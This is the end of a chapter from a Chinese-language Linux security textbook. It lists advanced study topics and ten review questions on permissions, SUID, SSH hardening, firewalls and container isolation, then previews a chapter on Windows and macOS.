### Linux安全方向
- 深入学习Linux内核安全机制（SELinux、Seccomp、Namespaces）
- 掌握Linux取证分析技术
- 学习Linux Rootkit的原理和检测
- 研究容器安全和编排安全

### Shell编程方向
- 深入学习Bash高级特性
- 学习Python替代Shell脚本进行系统管理
- 掌握自动化安全脚本编写
- 学习配置管理工具

## 学习检验

在进入下一章之前，检验你是否能够回答以下问题：

1. Linux的文件系统层次标准（FHS）中，`/etc`、`/var`、`/proc`目录分别存储什么？
2. 解释SUID权限的含义和安全风险
3. 如何查找系统中所有SUID文件？为什么这很重要？
4. 使用grep、sed、awk分别完成什么任务？举例说明
5. 描述一个完整的Linux提权思路（信息收集→漏洞识别→利用）
6. 如何检测系统是否被植入后门？
7. SSH安全加固应该配置哪些选项？
8. 如何使用iptables配置基本的防火墙规则？
9. Linux容器（Docker）与虚拟机的安全隔离有什么区别？
10. 为什么不应该使用root账户进行日常操作？

## 下一章预告

下一章我们将学习Windows和macOS操作系统的基础知识。虽然Linux是安全领域的主力，但Windows在企业环境中占据主导地位，macOS在开发者中越来越流行。理解不同操作系统的特点和安全机制，才能成为一名全面的安全专家。我们将对比三个操作系统的异同，帮助你建立完整的操作系统安全知识体系。
